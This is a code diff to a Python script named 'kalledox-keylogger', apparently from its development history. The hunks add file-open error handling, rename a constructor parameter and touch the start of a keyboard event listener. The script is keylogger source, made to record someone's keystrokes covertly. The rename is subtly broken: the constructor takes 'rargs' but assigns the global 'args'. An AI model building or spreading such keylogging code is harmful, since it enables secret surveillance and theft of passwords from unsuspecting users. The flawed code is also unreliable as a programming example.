@@ -6,17 +6,20 @@ import timestamp
 
 
 class Console:
-
-    def __init__(self, args):
-        self.args = args
+    def __init__(self, rargs):
+        self.rargs = args
 
     def verbose(self, text):
-        if self.args.verbose:
+        if self.rargs.verbose:
             print(text)
 
 
 def file(filename):
-    open(filename, 'a')
+    try:
+        open(filename, 'a')
+    except:
+        print('Error: can\'t open file "{}".'.format(filename))
+        exit()
     return filename
 
 keys = []
@@ -43,12 +46,14 @@ parser.add_argument('-v', '--verbose',
 args = parser.parse_args()
 
 if args.verbose and args.stdout:
+
     print('Error: incompatible parameters -v (or --verbose) and -s (or --stdout)')
     exit()
 
 console = Console(args)
 
 console.verbose('Starting kalledox-keylogger...')
+
 
 def keyboard_listener(event):
     if event.name == 'space':
